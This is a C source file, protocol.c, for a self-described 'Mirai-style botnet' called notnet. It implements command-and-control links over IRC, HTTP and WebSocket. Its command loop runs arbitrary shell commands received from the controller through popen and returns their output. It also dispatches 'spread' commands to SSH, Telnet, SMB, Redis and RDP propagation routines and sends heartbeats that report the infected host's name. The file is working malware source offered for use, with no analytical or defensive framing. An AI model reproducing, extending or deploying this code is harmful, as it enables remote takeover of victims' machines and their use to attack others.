/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.c - C2 protocol implementation (IRC, HTTP, WebSocket)
 */
#include "protocol.h"
#include "spread.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdarg.h>

/* ── IRC Implementation ───────────────────────────────────────── */
static int irc_create_socket(notnet_bot_t *bot) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IPV6);
    if (sock < 0) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    }
    if (sock < 0) {
        log_error("IRC: socket() failed: %s", strerror(errno));
        return -1;
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for connect timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_irc.port);
    
    /* Resolve server */
    struct hostent *he = gethostbyname(bot->c2_irc.server);
    if (!he) {
        log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
        close(sock);
        return -1;
    }
    
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    
    /* Non-blocking connect with select() timeout */
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        log_error("IRC: connect() failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    
    /* Wait for connection with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        log_error("IRC: connect() timed out");
        close(sock);
        return -1;
    }
    
    /* Check for connect error */
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        log_error("IRC: connect() failed: %s", strerror(so_error));
        close(sock);
        return -1;
    }
    
    /* Restore blocking mode for data transfer */
    fcntl(sock, F_SETFL, flags);
    
    return sock;
}

int irc_connect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) return 0;
    
    int sock = irc_create_socket(bot);
    if (sock < 0) return -1;
    
    bot->c2_irc.sock = sock;
    bot->c2_irc.connected = 1;
    bot->c2_irc.last_ping = time(NULL);
    
    log_info("IRC: connected to %s:%d", bot->c2_irc.server, bot->c2_irc.port);
    
    /* Send NICK and USER */
    irc_send(bot, "NICK %s%d", IRC_NICK_PREFIX, rand() % 1000);
    irc_send(bot, "USER %s 0 * :notnet bot", IRC_NICK_PREFIX);
    
    return 0;
}

int irc_send(notnet_bot_t *bot, const char *format, ...) {
    if (!bot->c2_irc.connected) return -1;
    
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    
    /* Ensure IRC protocol termination */
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
    
    int sent = send(bot->c2_irc.sock, full_cmd, strlen(full_cmd), 0);
    if (sent < 0) {
        log_error("IRC: send() failed: %s", strerror(errno));
        return -1;
    }
    
    return sent;
}

int irc_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_irc.connected) return -1;
    
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_irc.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    
    int received = recv(bot->c2_irc.sock, buf, len, 0);
    if (received <= 0) {
        log_info("IRC: connection closed");
        bot->c2_irc.connected = 0;
        close(bot->c2_irc.sock);
        bot->c2_irc.sock = -1;
        return -1;
    }
    
    /* Process IRC response */
    buf[received] = '\0';
    
    /* Check for PING */
    if (strstr(buf, "PING")) {
        char host[256];
        sscanf(buf, "PING :%s", host);
        irc_send(bot, "PONG :%s", host);
        log_debug("IRC: ponged %s", host);
    }
    
    /* Check for JOIN confirmation (366 End of NAMES) */
    if (strstr(buf, "366")) {
        log_info("IRC: joined channel %s", bot->c2_irc.channel);
        bot->c2_irc.authenticated = 1;
    }
    
    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode */
    if (strstr(buf, "376")) {
        log_info("IRC: MOTD complete, authenticated");
        bot->c2_irc.authenticated = 1;
    }
    
    /* Process PRIVMSG commands */
    char *privmsg = strstr(buf, "PRIVMSG");
    if (privmsg) {
        /* Find the message part after the channel name */
        char *colon = strchr(privmsg, ':');
        if (colon) {
            colon++; /* skip the colon, point to message text */
            /* Trim trailing \r\n */
            int msg_len = strlen(colon);
            while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
                colon[--msg_len] = '\0';
            }
            /* Copy full message text as the command (e.g. "exec uname -a") */
            int cmd_len = msg_len;
            if (cmd_len > len - 1) cmd_len = len - 1;
            memcpy(buf, colon, cmd_len);
            buf[cmd_len] = '\0';
            log_info("IRC: command: %s", buf);
            return 1; /* signal new command */
        }
    }
    
    return 0;
}

void irc_disconnect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) {
        bot->c2_irc.connected = 0;
        if (bot->c2_irc.sock >= 0) {
            close(bot->c2_irc.sock);
            bot->c2_irc.sock = -1;
        }
        log_info("IRC: disconnected");
    }
}

/* ── HTTP Implementation ───────────────────────────────────────── */
int http_connect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) return 0;
    
    log_info("HTTP: attempting connect to %s:%d", bot->c2_http.server, bot->c2_http.port);
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_http.port);
    
    struct hostent *he = gethostbyname(bot->c2_http.server);
    if (!he) {
        close(sock);
        return -1;
    }
    
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    fcntl(sock, F_SETFL, flags);
    
    bot->c2_http.sock = sock;
    bot->c2_http.connected = 1;
    log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
    return 0;
}

int http_post(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: heartbeat sent (%d bytes)", len);
    
    char headers[512];
    snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
    
    send(bot->c2_http.sock, headers, strlen(headers), 0);
    send(bot->c2_http.sock, data, len, 0);
    
    return 0;
}

int http_get(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    char req[512];
    snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);
    
    send(bot->c2_http.sock, req, strlen(req), 0);
    
    /* Read response */
    int total = 0;
    while (total < len - 1) {
        int received = recv(bot->c2_http.sock, buf + total, len - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    
    return total;
}

int http_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: http_read polling fd %d...", bot->c2_http.sock);
    
    /* Read response from existing connection (non-blocking) */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_http.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
    log_info("HTTP: http_read select returned %d", sel_result);
    if (sel_result <= 0) return 0;
    
    int received = recv(bot->c2_http.sock, buf, len, 0);
    log_info("HTTP: http_read recv returned %d", received);
    if (received <= 0) {
        log_info("HTTP: connection closed (recv=%d)", received);
        bot->c2_http.connected = 0;
        close(bot->c2_http.sock);
        bot->c2_http.sock = -1;
        return -1;
    }
    
    log_info("HTTP: received %d bytes: %.200s", received, buf);
    buf[received] = '\0';
    return received;
}

int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
    char buf[PAYLOAD_MAX_SIZE];
    int len = http_get(bot, buf, sizeof(buf));
    if (len <= 0) return -1;
    
    /* Simple HTTP response parsing - skip headers */
    char *body = strstr(buf, "\r\n\r\n");
    if (!body) return -1;
    body += 4;
    int body_len = len - (body - buf);
    
    FILE *f = fopen(dest, "wb");
    if (!f) return -1;
    fwrite(body, 1, body_len, f);
    fclose(f);
    
    return body_len;
}

void http_disconnect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) {
        bot->c2_http.connected = 0;
        if (bot->c2_http.sock >= 0) {
            close(bot->c2_http.sock);
            bot->c2_http.sock = -1;
        }
        log_info("HTTP: disconnected");
    }
}

/* ── WebSocket Implementation ─────────────────────────────────────── */
int ws_connect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) return 0;
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_ws.port);
    
    struct hostent *he = gethostbyname(bot->c2_ws.server);
    if (!he) {
        close(sock);
        return -1;
    }
    
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    fcntl(sock, F_SETFL, flags);
    
    bot->c2_ws.sock = sock;
    bot->c2_ws.connected = 1;
    log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
    
    return 0;
}

int ws_send(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_ws.connected) return -1;
    /* Simple WebSocket framing - send raw data for now */
    return send(bot->c2_ws.sock, data, len, 0);
}

int ws_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_ws.connected) return -1;
    
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_ws.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    
    int received = recv(bot->c2_ws.sock, buf, len, 0);
    if (received <= 0) {
        bot->c2_ws.connected = 0;
        close(bot->c2_ws.sock);
        bot->c2_ws.sock = -1;
        return -1;
    }
    
    buf[received] = '\0';
    return received;
}

void ws_disconnect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) {
        bot->c2_ws.connected = 0;
        if (bot->c2_ws.sock >= 0) {
            close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
        }
        log_info("WS: disconnected");
    }
}

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot) {
    /* Try IRC first (fast, lightweight) */
    if (bot->c2_enabled & C2_IRC) {
        if (!bot->c2_irc.connected) {
            if (irc_connect(bot) == 0) {
                irc_send(bot, "JOIN %s", bot->c2_irc.channel);
                bot->c2_irc.joined = 0;
            }
        } else if (!bot->c2_irc.joined && bot->c2_irc.authenticated) {
            /* Send JOIN once after authentication */
            irc_send(bot, "JOIN %s", bot->c2_irc.channel);
            bot->c2_irc.joined = 1;
            log_info("IRC: sent JOIN %s", bot->c2_irc.channel);
        }
    }
    
    /* Try HTTP if IRC fails */
    if (bot->c2_enabled & C2_HTTP) {
        if (!bot->c2_http.connected) {
            http_connect(bot);
        }
    }
    
    /* Try WebSocket as backup */
    if (bot->c2_enabled & C2_WS) {
        if (!bot->c2_ws.connected) {
            ws_connect(bot);
        }
    }
    
    return 0;
}

int protocol_process_commands(notnet_bot_t *bot) {
    char buf[1024];
    
    /* Check IRC - always read when connected, auth may not be set yet */
    if (bot->c2_irc.connected) {
        int result = irc_read(bot, buf, sizeof(buf));
        if (result == 1) {
            /* New command in buffer - add to queue */
            if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%s", buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Check HTTP - read responses for queued commands */
    if (bot->c2_http.connected) {
        memset(buf, 0, sizeof(buf));
        int result = http_read(bot, buf, sizeof(buf));
        if (result > 0) {
            log_info("HTTP: http_read returned %d bytes", result);
            /* Parse JSON command from response */
            char *cmd_key = strstr(buf, "\"cmd\"");
            char *val_key = strstr(buf, "\"value\"");
            if (cmd_key) {
                char cmd[128];
                snprintf(cmd, sizeof(cmd), "%s", cmd_key + 6);
                /* Extract value between quotes */
                char *start = strchr(cmd, '"');
                char *end = start ? strchr(start + 1, '"') : NULL;
                if (start && end && end > start) {
                    int clen = end - start - 1;
                    if (clen > 0 && clen < 254) {
                        memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                        strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
                        bot->cmd_queue[bot->cmd_count][clen] = '\0';
                        /* Extract "args" value and append to command */
                        char *args_key = strstr(buf, "\"args\"");
                        if (args_key) {
                            /* Find colon after "args" (6 chars), then skip to opening quote of value */
                            char *colon = strchr(args_key + 6, ':');
                            char *args_val = NULL;
                            if (colon) {
                                args_val = strchr(colon + 1, '\"');
                            }
                            if (args_val) {
                                char *args_end = strchr(args_val + 1, '\"');
                                if (args_end && args_end > args_val) {
                                    int alen = args_end - args_val - 1;
                                    if (alen > 0 && clen + 1 + alen < 254) {
                                        bot->cmd_queue[bot->cmd_count][clen] = ' ';
                                        strncat(bot->cmd_queue[bot->cmd_count], args_val + 1, alen);
                                    }
                                }
                            }
                        }
                        bot->cmd_count++;
                        log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                    }
                }
            }
        }
    }
    
    /* Check WebSocket */
    if (bot->c2_ws.connected) {
        int result = ws_read(bot, buf, sizeof(buf));
        if (result > 0) {
            if (bot->cmd_count < 256) {
                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%s", buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Process queued commands */
    for (int i = 0; i < bot->cmd_count; i++) {
        char *cmd = bot->cmd_queue[i];
        
        if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
            char *args = cmd + strlen(CMD_SPREAD);
            while (*args == ' ' || *args == '\t') args++;
            /* Parse target:port */
            char host[256] = {0};
            uint16_t port = 0;
            if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                log_info("CMD: spread %s:%d", host, port);
                switch (port) {
                    case 22:  spread_ssh(bot, host, port); break;
                    case 23:  spread_telnet(bot, host, port); break;
                    case 445: spread_smb(bot, host, port); break;
                    case 6379: spread_redis(bot, host, port); break;
                    case 3389: spread_rdp(bot, host, port); break;
                    default: log_info("CMD: spread unknown port %d", port); break;
                }
            } else {
                log_info("CMD: spread invalid format, use target:port");
            }
        } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
            log_info("CMD: scan");
        } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
            char *args = cmd + strlen(CMD_EXEC);
            /* Skip leading whitespace */
            while (*args == ' ' || *args == '\t') args++;
            log_info("CMD: exec: %s", args);
            char output[1024] = {0};
            FILE *fp = popen(args, "r");
            if (fp) {
                size_t n = 0;
                while (fgets(output + n, sizeof(output) - n, fp)) n++;
                pclose(fp);
                log_info("CMD: exec output (%zu bytes)", n);
                protocol_send_response(bot, CMD_EXEC, output);
            } else {
                snprintf(output, sizeof(output), "exec failed: %s", strerror(errno));
                log_info("CMD: exec failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, output);
            }
        } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
            log_info("CMD: download");
        } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
            log_info("CMD: update");
        } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
            log_info("CMD: reboot");
        } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
            char *interval = strchr(cmd, ' ');
            if (interval) {
                bot->scan_interval = atoi(interval + 1);
                log_info("CMD: sleep interval set to %d", bot->scan_interval);
            }
        } else if (strncmp(cmd, CMD_CONFIG_SET, strlen(CMD_CONFIG_SET)) == 0) {
            log_info("CMD: config_set: %s", cmd + strlen(CMD_CONFIG_SET));
        }
    }
    
    /* Clear processed commands */
    bot->cmd_count = 0;
    
    return 0;
}

int protocol_send_heartbeat(notnet_bot_t *bot) {
    char heartbeat[512];
    snprintf(heartbeat, sizeof(heartbeat),
        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u}",
        NOTNET_VERSION, bot->hostname, (long)(time(NULL) - bot->uptime), bot->scan_count);
    
    /* Send via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, heartbeat);
    }
    
    /* Send via HTTP */
    if (bot->c2_http.connected) {
        http_post(bot, heartbeat, strlen(heartbeat));
        /* http_read() in protocol_process_commands() will pick up
         * the response on the next loop iteration */
    }
    
    /* Send via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, heartbeat, strlen(heartbeat));
    }
    
    return 0;
}

int protocol_resolve_peers(notnet_bot_t *bot) {
    /* DNS enumeration for peer discovery */
    struct hostent *he = gethostbyname(DNS_PEER_RESOLUTION);
    if (!he) return -1;
    
    bot->peer_count = 0;
    for (int i = 0; he->h_addr_list[i] && bot->peer_count < PEER_CACHE_SIZE; i++) {
        char *ip = inet_ntoa(*(struct in_addr *)he->h_addr_list[i]);
        if (ip) {
            strncpy(bot->peer_cache[bot->peer_count], ip, 255);
            bot->peer_count++;
        }
    }
    
    log_info("DNS: resolved %d peers for %s", bot->peer_count, DNS_PEER_RESOLUTION);
    return 0;
}

int protocol_resolve_host(const char *host) {
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    
    struct in_addr *addr = (struct in_addr *)he->h_addr;
    if (!addr) return -1;
    
    return inet_addr(inet_ntoa(*addr));
}

char *protocol_hex_encode(const char *data, int len) {
    static char buf[1024];
    int pos = 0;
    
    for (int i = 0; i < len && pos < 1023; i++) {
        pos += snprintf(buf + pos, 3, "%02x", (unsigned char)data[i]);
    }
    
    buf[pos] = '\0';
    return buf;
}

int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result) {
    char response[512];
    snprintf(response, sizeof(response),
        "{\"cmd\":\"%s\",\"result\":\"%s\",\"hostname\":\"%s\"}",
        command, result, bot->hostname);
    int len = strlen(response);
    
    /* Send response via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, response);
        log_info("IRC: response sent (%d bytes)", len);
    }
    
    /* Send response via HTTP */
    if (bot->c2_http.connected) {
        http_post(bot, response, len);
        log_info("HTTP: response sent (%d bytes)", len);
    }
    
    /* Send response via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, response, len);
        log_info("WS: response sent (%d bytes)", len);
    }
    
    return len;
}

/* ── Config Loading ──────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        log_info("No config file at %s, using defaults", path);
        return -1;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        /* Remove newline */
        line[strcspn(line, "\n")] = '\0';
        
        /* Skip comments and empty lines */
        if (line[0] == '#' || line[0] == '\0') continue;
        
        /* Parse key=value */
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        
        char *key = line;
        char *value = eq + 1;
        
        if (strcmp(key, "irc_server") == 0) {
            strncpy(bot->c2_irc.server, value, 255);
        } else if (strcmp(key, "irc_port") == 0) {
            bot->c2_irc.port = atoi(value);
        } else if (strcmp(key, "http_server") == 0) {
            strncpy(bot->c2_http.server, value, 255);
        } else if (strcmp(key, "http_port") == 0) {
            bot->c2_http.port = atoi(value);
        } else if (strcmp(key, "scan_interval") == 0) {
            bot->scan_interval = atoi(value);
        } else if (strcmp(key, "ssh_enabled") == 0) {
            bot->ssh_enabled = atoi(value);
        } else if (strcmp(key, "telnet_enabled") == 0) {
            bot->telnet_enabled = atoi(value);
        } else if (strcmp(key, "scan_timeout_ms") == 0) {
            bot->scan_timeout_ms = atoi(value);
        } else if (strcmp(key, "scan_max_hosts") == 0) {
            bot->scan_max_hosts = atoi(value);
        } else if (strcmp(key, "heartbeat_interval") == 0) {
            if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
        } else if (strcmp(key, "irc_channel") == 0) {
            strncpy(bot->c2_irc.channel, value, 127);
            log_info("IRC channel set to %s", bot->c2_irc.channel);
        } else if (strcmp(key, "irc_pass") == 0) {
            strncpy(bot->c2_irc.pass, value, 63);
        } else if (strcmp(key, "http_path") == 0) {
            strncpy(bot->c2_http.path, value, 127);
        } else if (strcmp(key, "http_user_agent") == 0) {
            strncpy(bot->c2_http.user_agent, value, 127);
        } else if (strcmp(key, "ws_path") == 0) {
            strncpy(bot->c2_ws.path, value, 127);
        } else if (strcmp(key, "smb_enabled") == 0) {
            bot->smb_enabled = atoi(value);
        } else if (strcmp(key, "redis_enabled") == 0) {
            bot->redis_enabled = atoi(value);
        } else if (strcmp(key, "rdp_enabled") == 0) {
            bot->rdp_enabled = atoi(value);
        } else if (strncmp(key, "scan_target_", 12) == 0) {
            /* Legacy: scan_target_0, scan_target_1, etc. */
            int idx = atoi(key + 12);
            if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
                bot->scan_target_count = idx + 1;
                strncpy(bot->scan_targets[idx], value, 255);
            }
        }
    }
    
    /* Auto-detect enabled protocols from config */
    if (bot->c2_irc.port != IRC_DEFAULT_PORT) {
        bot->c2_enabled |= C2_IRC;
        log_info("C2: IRC enabled (%s:%d)", bot->c2_irc.server, bot->c2_irc.port);
    }
    if (bot->c2_http.port != HTTP_DEFAULT_PORT) {
        bot->c2_enabled |= C2_HTTP;
        log_info("C2: HTTP enabled (%s:%d)", bot->c2_http.server, bot->c2_http.port);
    }
    if (bot->c2_ws.port != WS_DEFAULT_PORT) {
        bot->c2_enabled |= C2_WS;
        log_info("C2: WebSocket enabled (%s:%d)", bot->c2_ws.server, bot->c2_ws.port);
    }
    if (bot->c2_enabled == 0) {
        log_info("C2: no protocols enabled (use irc_server/http_server/http_port)");
    }
    
    fclose(f);
    log_info("Config loaded from %s", path);
    return 0;
}
